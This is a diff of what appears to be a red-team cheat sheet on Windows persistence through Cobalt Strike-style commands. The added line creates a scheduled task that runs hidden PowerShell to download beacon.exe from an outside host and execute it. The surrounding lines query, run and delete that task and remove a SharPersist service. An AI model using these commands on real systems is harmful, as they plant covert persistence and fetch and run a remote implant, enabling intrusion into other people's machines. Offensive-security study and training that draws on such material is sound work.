@@ -42,7 +42,7 @@ execute-assembly /root/SharPersist.exe -t service -n "Name" -m remove
 
 ### Task Scheduler (schtasks)
 ```powershell
-shell schtasks /create /sc minute /mo 1 /tn cool /tr "copy /Y C:\Users\Hassan\long.exe C:\Users\Hassan\short.exe & C:\Users\Hassan\short.exe"
+shell schtasks /create /sc hourly /mo 1 /tn cool /tr "powershell -w hidden -c \"Invoke-WebRequest -URI http://192.168.80.100/beacon.exe -O C:\windows\temp\beacon.exe; Start-Process C:\windows\temp\beacon.exe\""
 shell schtasks /query /tn cool /V /FO LIST
 shell schtasks /run /tn "cool"
 shell schtasks /delete /tn "cool"
